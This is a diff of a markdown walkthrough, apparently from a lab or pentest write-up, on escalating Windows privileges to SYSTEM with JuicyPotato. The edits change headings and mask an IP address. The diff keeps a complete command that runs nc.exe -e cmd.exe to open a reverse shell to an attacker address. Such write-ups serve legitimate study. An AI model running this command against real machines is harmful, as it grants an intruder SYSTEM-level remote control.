@@ -91,7 +91,7 @@ We're insterested in SYSTEM CLSID. Grab one of SYSTEM CLSID.
 
 Now we've found valid CLSID for SYSTEM we can use that CLSID and get system shell.
 
-# Reverse Shell
+## Reverse Shell
 
 # Using Powershell shell.bat
 
@@ -105,7 +105,7 @@ c:\\Users\\Bob\\Desktop\\JuicyPotato.exe -l 1234 -p c:\\Users\\Bob\\Desktop\\she
 
 ```markdown
 
-c:\\Users\\Bob\\Desktop\\jp32.exe -l 443 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\Users\\Bob\\Desktop\\nc.exe -e cmd.exe 192.168.49.154 443" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}
+c:\\Users\\Bob\\Desktop\\jp32.exe -l 443 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\Users\\Bob\\Desktop\\nc.exe -e cmd.exe 192.168.x.x 443" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}
 
 ```
 
@@ -119,7 +119,7 @@ c:\\Users\\Bob\\Desktop\\jp32.exe -l 443 -p c:\\windows\\system32\\cmd.exe -a "/
 
 ![OnPaste 20220606-195312](https://user-images.githubusercontent.com/106917304/172180304-91e48267-0a99-43cd-bd33-0f13c36c90d9.png)
 
-We're now SYSTEM.
+# Get Reverse Shell as SYSTEM
 
 ![OnPaste 20220606-195431](https://user-images.githubusercontent.com/106917304/172180726-4bdb1672-1a35-4e06-8458-a873b49c6926.png)
 
